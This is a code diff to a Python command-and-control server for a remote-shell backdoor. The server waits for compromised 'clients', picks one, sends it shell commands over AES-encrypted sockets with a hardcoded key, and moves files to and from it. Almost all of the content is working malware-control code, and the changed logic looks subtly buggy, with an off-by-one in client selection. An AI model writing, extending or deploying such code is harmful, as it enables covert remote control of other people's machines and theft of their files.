@@ -12,6 +12,14 @@ Decode = lambda c, x: c.decrypt(b64decode(x))
 def pr(s):
   print(s + '\n')
 
+def get_cipher():
+  key = b'xxxx cccc vvvv b'
+  iv  = b'gggg hhhh jjjj k'
+  
+  cipher = AES.new(key, AES.MODE_CFB, iv)
+
+  return cipher
+
 # clear
 if os.name == 'posix': s = 'clear' # linux
 if os.name == 'nt':    s = 'cls'   # windows
@@ -80,19 +88,21 @@ def upload(sock, file):
     f.close()
 
 def refresh():
-    clear()
+  clear()
 
-    pr('Listening for clients...')
+  pr('Listening for clients...')
 
-    l = len(clients)
-    if l > 0:
-        for i in range(0, l):
-            j = i + 1
-            pr('Client %d: %s' % (j, clients[i]))
-    else:
-        pr('...')
+  l = len(clients)
 
-    pr('Press Ctrl+C to interact with client.\n')
+  if l == 0:
+    pr('...')
+    return
+
+  for i in range(0, l):
+    j = i + 1
+    pr('Client %d: %s' % (j, clients[i]))
+
+  pr('Press Ctrl+C to interact with client.')
 
 while True:
   refresh()
@@ -107,6 +117,7 @@ while True:
     s.settimeout(None)
     socks.append(s)
     clients.append(str(a))
+
     refresh()
   except KeyboardInterrupt:
     activate = input('Enter option: ')
@@ -119,63 +130,54 @@ while True:
 
       sys.exit()
 
-    activate -= 1
-    
-    clear()
-
-    cipher = AES.new('xxx', AES.MODE_CFB, '0000000000000000')
+    Send(socks[activate], 'Activate')
 
     pr('Activating client %d: %s' % (activate, clients[activate]))
 
+    activate -= 1
+    cipher = get_cipher()
     active = True
-    Send(socks[activate], 'Activate')
 
   while active:
+    sock = socks[activate]
+    client = clients[activate]
+
     try:
-      data = Receive(socks[activate])
+      data = Receive(sock)
     except:
       active = False
+      pr('Client %s disconnected.' % client)
 
-      pr('Client disconnected... ' + clients[activate])
-
-      socks[activate].close()
-      socks.remove(socks[activate])
-      clients.remove(clients[activate])
-
+      sock.close()
+      socks.remove(sock)
+      clients.remove(client)
       refresh()
      
       break
 
-    if data == 'quitted':
+    if data == 'exit':
       active = False
-
       pr('Exit.')
 
-      socks[activate].close()
-      socks.remove(socks[activate])
-      clients.remove(clients[activate])
-
+      sock.close()
+      socks.remove(sock)
+      clients.remove(client)
       refresh()
-     
+
       break
+
     elif data != '':
       sys.stdout.write(data)
-      nextcmd = raw_input()
+      nc = raw_input() # next cmd
 
-      if nextcmd.startswith('download '):
-        if len(nextcmd.split(' ')) > 2:
-          download(socks[activate], nextcmd.split(' ')[1], nextcmd.split(' ')[2])
-        else:
-          download(socks[activate], nextcmd.split(' ')[1])
+      if nc.startswith('download '):
+        download(sock, nc.split(' ')[1])
 
-      elif nextcmd.startswith('upload '):
-        if len(nextcmd.split(' ')) > 2:
-          upload(socks[activate], nextcmd.split(' ')[1], nextcmd.split(' ')[2])
-        else:
-          upload(socks[activate], nextcmd.split(' ')[1])
+      elif nc.startswith('upload '):
+        upload(sock, nc.split(' ')[1])
 
-      elif nextcmd != '':
-        Send(socks[activate], nextcmd)
+      elif nc != '':
+        Send(sock, nc)
 
-      elif nextcmd == '':
-        pr('Think before you type. ;)')
+      elif nc == '':
+        pr('Think before you type.')
